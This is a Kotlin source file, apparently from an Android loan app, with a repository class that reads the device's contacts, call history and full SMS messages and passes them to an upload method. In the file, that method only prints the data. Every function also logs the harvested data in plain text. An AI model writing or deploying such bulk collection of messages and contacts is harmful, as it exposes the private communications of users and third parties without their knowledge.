package com.example.loanapplication.data.repositories

import android.content.ContentResolver
import android.database.Cursor
import android.net.Uri
import android.provider.CallLog
import android.provider.ContactsContract
import com.example.loanapplication.data.source.remote.ApiService
import com.example.loanapplication.domain.models.CallLogs
import com.example.loanapplication.domain.models.Contacts
import com.example.loanapplication.domain.models.Messages
import com.example.loanapplication.domain.repositories.SyncUserDataRepo
import javax.inject.Inject

class SyncUserRepoImpl @Inject constructor(
    private val contentResolver: ContentResolver,
    private val apiService: ApiService
) : SyncUserDataRepo{

    override suspend fun getContactsList(): List<Contacts> {
        return try {
            val contactsList = mutableListOf<Contacts>()
            val projection = arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            )

            val cursor: Cursor? = contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                projection,
                null,
                null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )

            cursor?.use {
                val nameIndex =
                    it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numberIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

                while (it.moveToNext()) {
                    val name = it.getString(nameIndex)
                    val number = it.getString(numberIndex)
                    contactsList.add(Contacts(name, number))
                }
            }
            println("Contacts List: $contactsList")
            return contactsList
        }catch (e:Exception){
            emptyList()
        }
    }

    override suspend fun getCallLogsList(): List<CallLogs> {
        return try {
            val callLogsList = mutableListOf<CallLogs>()

            // Define the columns to retrieve
            val projection = arrayOf(
                CallLog.Calls.NUMBER,      // The phone number involved in the call
                CallLog.Calls.TYPE,        // The type of call (incoming, outgoing, missed)
                CallLog.Calls.DURATION     // The duration of the call
            )

            // Query the call log content provider
            val cursor: Cursor? = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                CallLog.Calls.DATE + " DESC" // Sort by date in descending order
            )

            // Iterate over the cursor and add call logs to the list
            cursor?.use {
                val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
                val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)
                val durationIndex = it.getColumnIndex(CallLog.Calls.DURATION)

                while (it.moveToNext()) {
                    val number = it.getString(numberIndex)
                    val type = when (it.getInt(typeIndex)) {
                        CallLog.Calls.INCOMING_TYPE -> "Incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                        CallLog.Calls.MISSED_TYPE -> "Missed"
                        else -> "Unknown"
                    }
                    val duration = it.getLong(durationIndex)
                    callLogsList.add(CallLogs(number, type, duration.toString()))
                }
            }
            println("Call Logs : $callLogsList")
            callLogsList
        }catch (e:Exception){
            emptyList()
        }
    }

    override suspend fun getMessagesList(): List<Messages> {
        return try {
            val smsList = mutableListOf<Messages>()
            val uri = Uri.parse("content://sms/")
            val cursor = contentResolver.query(
                uri,
                arrayOf("address","body", "type"),
                null,
                null,
                "date DESC" // Sort by date in descending order
            )

            cursor?.use {
                val addressIndex = it.getColumnIndex("address")
                val bodyIndex = it.getColumnIndex("body")
                val typeIndex = it.getColumnIndex("type")
                while (it.moveToNext()) {
                    val address = it.getString(addressIndex) // Sender/Receiver number
                    val body = it.getString(bodyIndex) // Message content
                    val type = it.getInt(typeIndex) // 1 = received, 2 = sent

                    val sender: String?
                    val receiver: String?

                    if (type == 1) { // Received message
                        sender = address
                        receiver = "user_number" // Could be the user's number, which typically isn't stored in SMS
                    } else { // Sent message
                        sender = "user_number" // Could be the user's number, which typically isn't stored in SMS
                        receiver = address
                    }
                    smsList.add(Messages(sender, receiver, body))
                }
            }
            println("Messages: $smsList")
            smsList
        } catch (e: Exception) {
            emptyList()
        }
    }

    override suspend fun uploadData(
        contacts: List<Contacts>,
        messages: List<Messages>,
        callLogs: List<CallLogs>
    ) {
        println("Data: $contacts")
        println("Data: $messages")
        println("Data: $callLogs")
    }

}